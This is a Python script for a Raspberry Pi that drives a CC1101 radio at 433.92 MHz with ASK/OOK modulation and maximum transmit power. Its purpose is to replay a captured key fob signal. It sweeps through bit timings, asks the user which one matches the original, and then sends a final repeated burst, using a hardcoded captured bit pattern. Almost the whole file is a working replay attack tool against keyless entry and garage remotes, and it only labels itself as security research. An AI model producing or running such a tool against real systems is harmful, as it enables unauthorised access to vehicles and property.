
import RPi.GPIO as GPIO
import time

class CC1101_KeyFobReplay:
    """
    CC1101 optimized for key fob replay attacks
    Shows real-world transmission speeds
    """
    
    def __init__(self, sck, mosi, miso, csn, gdo0, gdo2):
        self.SCK = sck
        self.MOSI = mosi
        self.MISO = miso
        self.CSN = csn
        self.GDO0 = gdo0
        self.GDO2 = gdo2

        GPIO.setmode(GPIO.BCM)
        GPIO.setwarnings(False)
        GPIO.setup(self.SCK, GPIO.OUT)
        GPIO.setup(self.MOSI, GPIO.OUT)
        GPIO.setup(self.MISO, GPIO.IN)
        GPIO.setup(self.CSN, GPIO.OUT)
        GPIO.setup(self.GDO0, GPIO.IN)
        GPIO.setup(self.GDO2, GPIO.IN)

        GPIO.output(self.SCK, GPIO.LOW)
        GPIO.output(self.MOSI, GPIO.LOW)
        GPIO.output(self.CSN, GPIO.HIGH)

    def spi_write(self, byte):
        """SPI write - slow for setup, but CC1101 transmits at full speed"""
        for i in range(8):
            GPIO.output(self.SCK, GPIO.LOW)
            time.sleep(0.001)
            GPIO.output(self.MOSI, (byte & (1 << (7 - i))) != 0)
            time.sleep(0.001)
            GPIO.output(self.SCK, GPIO.HIGH)
            time.sleep(0.001)
        GPIO.output(self.SCK, GPIO.LOW)

    def spi_read(self):
        value = 0
        for i in range(8):
            GPIO.output(self.SCK, GPIO.HIGH)
            time.sleep(0.001)
            if GPIO.input(self.MISO):
                value |= (1 << (7 - i))
            GPIO.output(self.SCK, GPIO.LOW)
            time.sleep(0.001)
        return value

    def write_register(self, addr, value):
        GPIO.output(self.CSN, GPIO.LOW)
        time.sleep(0.001)
        self.spi_write(addr)
        self.spi_write(value)
        time.sleep(0.001)
        GPIO.output(self.CSN, GPIO.HIGH)

    def send_strobe(self, strobe):
        GPIO.output(self.CSN, GPIO.LOW)
        time.sleep(0.001)
        self.spi_write(strobe)
        status = self.spi_read()
        time.sleep(0.001)
        GPIO.output(self.CSN, GPIO.HIGH)
        return status

    def init_keyfob_mode(self):
        """Initialize CC1101 specifically for key fob replay"""
        print("[INFO] Initializing CC1101 for Key Fob Replay...")
        
        # Reset
        GPIO.output(self.CSN, GPIO.HIGH)
        time.sleep(0.1)
        GPIO.output(self.CSN, GPIO.LOW)
        time.sleep(0.01)
        GPIO.output(self.CSN, GPIO.HIGH)
        time.sleep(0.1)
        
        GPIO.output(self.CSN, GPIO.LOW)
        time.sleep(0.001)
        self.spi_write(0x30)  # SRES
        time.sleep(0.001)
        GPIO.output(self.CSN, GPIO.HIGH)
        time.sleep(0.2)
        
        # Key fob optimized configuration
        keyfob_config = [
            # Frequency: 433.92 MHz (common key fob frequency)
            (0x0D, 0x21),  # FREQ2
            (0x0E, 0xB0),  # FREQ1  
            (0x0F, 0x6A),  # FREQ0
            
            # Data rate: ~4.8 kBaud (typical for key fobs)
            (0x10, 0xC8),  # MDMCFG4
            (0x11, 0x93),  # MDMCFG3
            
            # ASK/OOK modulation (key fob standard)
            (0x12, 0x30),  # MDMCFG2 - ASK/OOK, no sync
            (0x13, 0x22),  # MDMCFG1
            (0x14, 0xF8),  # MDMCFG0
            
            # Async transmission (raw data, no packet processing)
            (0x08, 0x32),  # PKTCTRL0 - async serial mode
            (0x07, 0x00),  # PKTCTRL1 - no CRC, no address
            
            # State machine: optimized for fast key fob bursts
            (0x18, 0x16),  # MCSM0 - auto-calibrate  
            (0x19, 0x0F),  # MCSM1 - stay in TX, idle after TX
            
            # Power and front-end
            (0x1C, 0xC7),  # FREND1
            (0x1D, 0x00),  # FREND0
            
            # Calibration for 433 MHz
            (0x1E, 0xB0),  # FSCAL3
            (0x21, 0xB6),  # FSCAL2
            (0x22, 0x10),  # FSCAL1
            (0x23, 0xEA),  # FSCAL0
            
            # GPIO config
            (0x02, 0x06),  # IOCFG0 - sync word sent
        ]
        
        print("[DEBUG] Loading key fob configuration...")
        for addr, value in keyfob_config:
            self.write_register(addr, value)
            time.sleep(0.002)
        
        # Maximum power for good range
        GPIO.output(self.CSN, GPIO.LOW)
        time.sleep(0.001)
        self.spi_write(0x7E)  # PATABLE
        self.spi_write(0xFF)  # Max power
        time.sleep(0.001)
        GPIO.output(self.CSN, GPIO.HIGH)
        
        print("[SUCCESS] ✅ Key fob mode ready!")

    def replay_keyfob_signal(self, bit_pattern, bit_duration_ms=0.4, repeat_count=5, inter_repeat_delay_ms=10):
        """
        Replay a key fob signal with realistic timing
        
        Args:
            bit_pattern: String of 1s and 0s (your captured signal)
            bit_duration_ms: Duration per bit in milliseconds (typical: 0.3-1.0)
            repeat_count: How many times to repeat (key fobs typically repeat 3-5 times)
            inter_repeat_delay_ms: Delay between repetitions
        """
        
        # Convert bit string to bytes
        padded_bits = bit_pattern
        while len(padded_bits) % 8 != 0:
            padded_bits = '0' + padded_bits
        
        data_bytes = []
        for i in range(0, len(padded_bits), 8):
            byte_chunk = padded_bits[i:i+8]
            data_bytes.append(int(byte_chunk, 2))
        
        print(f"\n[KEYFOB REPLAY]")
        print(f"Pattern: {bit_pattern}")
        print(f"Bits: {len(bit_pattern)}")
        print(f"Bytes: {data_bytes}")
        print(f"Bit duration: {bit_duration_ms}ms")
        print(f"Total signal time: {len(bit_pattern) * bit_duration_ms}ms")
        print(f"Repeats: {repeat_count}")
        print()
        
        # Calculate transmission timing
        total_time_per_repeat = len(bit_pattern) * bit_duration_ms
        
        for repeat in range(repeat_count):
            print(f"[REPLAY {repeat+1}/{repeat_count}] Transmitting...")
            start_time = time.time()
            
            # Prepare for transmission
            self.send_strobe(0x36)  # SIDLE
            time.sleep(0.01)
            self.send_strobe(0x3A)  # Flush TX FIFO
            time.sleep(0.01)
            
            # Load data
            GPIO.output(self.CSN, GPIO.LOW)
            time.sleep(0.001)
            self.spi_write(0x3F)  # TX FIFO
            for byte in data_bytes:
                self.spi_write(byte)
            time.sleep(0.001)
            GPIO.output(self.CSN, GPIO.HIGH)
            
            # Start transmission
            self.send_strobe(0x35)  # STX
            
            # Wait for transmission to complete
            # (CC1101 transmits at configured data rate, not our slow SPI rate!)
            transmission_time = total_time_per_repeat / 1000.0  # Convert to seconds
            time.sleep(transmission_time + 0.05)  # Add small buffer
            
            # Return to idle
            self.send_strobe(0x36)  # SIDLE
            
            actual_time = time.time() - start_time
            print(f"[TIMING] Expected: {transmission_time:.3f}s, Actual: {actual_time:.3f}s")
            
            # Inter-repeat delay (like real key fobs)
            if repeat < repeat_count - 1:
                time.sleep(inter_repeat_delay_ms / 1000.0)
        
        print(f"[SUCCESS] ✅ Key fob replay complete!")

def demo_key_fob_speeds():
    """Demonstrate different key fob transmission speeds"""
    print("CC1101 Key Fob Speed Demonstration")
    print("=" * 50)
    
    cc = CC1101_KeyFobReplay(21, 20, 19, 12, 26, 16)
    cc.init_keyfob_mode()
    
    # Demo different key fob speeds
    test_pattern = "1010101010101010"  # Simple test pattern
    
    speeds = [
        (2.0, "Very Slow (some garage doors)"),
        (1.0, "Slow (old remotes)"), 
        (0.5, "Medium (common key fobs)"),
        (0.3, "Fast (modern key fobs)"),
        (0.1, "Very Fast (advanced systems)")
    ]
    
    for bit_duration, description in speeds:
        print(f"\n--- {description} ---")
        print(f"Bit duration: {bit_duration}ms")
        print(f"Effective data rate: {1000/bit_duration:.1f} bits/second")
        print(f"[SDR] *** Watch for signal - {description} ***")
        
        cc.replay_keyfob_signal(
            bit_pattern=test_pattern,
            bit_duration_ms=bit_duration,
            repeat_count=3,
            inter_repeat_delay_ms=50
        )
        
        time.sleep(3)
    
    return cc

def replay_your_keyfob(cc):
    """Replay your actual captured key fob signal"""
    print("\n" + "=" * 60)
    print("REPLAYING YOUR ACTUAL KEY FOB SIGNAL")
    print("=" * 60)
    
    your_signal = "1000111010001110100010001000111011101110111011101110111010001110100011101110111010001000100011101"
    
    print("This will replay your signal at different speeds to find the best match")
    print()
    
    # Try different speeds to see which looks most like original
    speeds = [1.0, 0.5, 0.3, 0.4]  # Common key fob bit durations
    
    for speed in speeds:
        print(f"\n[REPLAY TEST] Speed: {speed}ms per bit")
        print(f"[SDR] *** WATCH CAREFULLY - Does this match your original? ***")
        
        cc.replay_keyfob_signal(
            bit_pattern=your_signal,
            bit_duration_ms=speed,
            repeat_count=3,
            inter_repeat_delay_ms=20
        )
        
        user_input = input(f"Did {speed}ms speed look right? (y/n): ").lower()
        if user_input == 'y':
            print(f"✅ Found optimal speed: {speed}ms per bit")
            
            # Do final replay with optimal speed
            print(f"\n[FINAL REPLAY] Using {speed}ms timing...")
            cc.replay_keyfob_signal(
                bit_pattern=your_signal,
                bit_duration_ms=speed,
                repeat_count=5,
                inter_repeat_delay_ms=10
            )
            break
        
        time.sleep(2)

# Main demonstration
if __name__ == "__main__":
    try:
        print("🎯 CC1101 KEY FOB REPLAY DEMONSTRATION")
        print("This shows the CC1101 can easily handle key fob speeds!")
        print()
        
        # Demo different speeds
        working_cc = demo_key_fob_speeds()
        
        input("\nPress ENTER to replay your actual key fob signal...")
        replay_your_keyfob(working_cc)
        
        print("\n🎯 CONCLUSION:")
        print("✅ CC1101 is FAST enough for key fob replay")
        print("✅ Only our SPI setup is slow")
        print("✅ RF transmission happens at full speed")
        print("✅ Perfect for security research!")
        
    except KeyboardInterrupt:
        print("\nStopped by user")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        GPIO.cleanup()
        print("GPIO cleanup complete")
